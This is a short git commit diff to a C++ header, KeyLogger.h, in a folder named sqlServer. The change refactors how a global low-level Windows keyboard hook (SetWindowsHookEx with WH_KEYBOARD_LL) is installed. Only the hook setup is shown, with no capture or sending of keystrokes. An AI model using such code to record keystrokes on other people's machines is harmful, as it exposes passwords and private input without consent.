14b3e8b939fbeb6f46f690007cc0d2ebedcc71c6
ReapersSoul <56406337+ReapersSoul@users.noreply.github.com>
2020-08-20 12:30:32 -0400

    update

--- sqlServer/KeyLogger.h
+++ sqlServer/KeyLogger.h
@@ -11,16 +11,11 @@ class KeyLogger
 
     bool is_enabled = false;
 
-    void (*callback)(int nCode, WPARAM wParam, LPARAM lParam);
-
-    LRESULT HookCallbackKeyboard(int nCode, WPARAM wParam, LPARAM lParam) {
-        callback(nCode, wParam, lParam);
-        return CallNextHookEx(HK, nCode, wParam, lParam);
-    }
+    LRESULT(*HookCallbackKeyboard)(int nCode, WPARAM wParam, LPARAM lParam);
 
     void SetHook()
     {
-        if (!(HK = SetWindowsHookEx(WH_KEYBOARD_LL, &HookCallbackKeyboard, NULL, 0)))
+        if (!(HK = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallbackKeyboard, NULL, 0)))
         {
             MessageBox(NULL, L"Failed to install hook on keyboard!", L"Error", MB_ICONERROR);
         }
